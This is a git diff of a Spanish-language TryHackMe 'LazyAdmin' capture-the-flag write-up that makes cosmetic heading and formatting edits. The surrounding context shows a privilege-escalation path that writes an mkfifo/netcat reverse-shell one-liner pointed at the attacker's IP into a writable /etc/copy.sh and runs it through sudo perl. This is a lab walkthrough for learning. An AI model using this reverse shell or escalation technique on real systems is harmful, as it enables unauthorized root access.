@@ -220,7 +220,7 @@ Para este segundo método utilizaremos el primer enlace de la búsqueda que hici
 
 Ponemos en escucha el puerto con el que configuramos la reverse shell y visitamos la URL que nos proporciona el output del exploit.
 
-#### Primera Flag
+#### :triangular_flag_on_post:Primera Flag
 
 Con el comando `id`podemos ver que somos el usuario `www-data`. Para la escalación de privilegios procedemos con alguna enumeracón básica de linux. Con el comando `sudo -l`podemos ver que comandos podemos correr con permisos de root.
 
@@ -228,7 +228,7 @@ Nos dirigimos al directorio home para ver a que carpeta de directorios de usuari
 
 ![alt text](https://github.com/k1m3rA/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/user.png)
 
-#### Escalación de privilegios
+#### :warning:Escalación de privilegios
 
 ```console
 $ sudo -l
@@ -251,11 +251,12 @@ system("sh", "/etc/copy.sh");
 Al revisar el código vemos que edita otro archivo `sh`del directorio `etc`, el cual si revisamos los permisos con `ls -l /etc/copy.sh`tenemos permiso para escribir contenidos en él. Con el comando `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $TU_IP 5757 >/tmp/f" > /etc/copy.sh`.
 Ahora ejecutamos el archivo en perl, no sin antes poner en escucha el puerto 5757:
 ```console
-sudo /usr/bin/perl /home/itguy/backup.pl
+$ sudo /usr/bin/perl /home/itguy/backup.pl
 ```
-#### Segunda Flag
+#### :triangular_flag_on_post:Segunda Flag
 
 Si hacemos in id ya somos usuario root y ya podemos acceder al /root/root.txt:
+
 ![alt text](https://github.com/k1m3rA/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/rootflag.png)
 
 
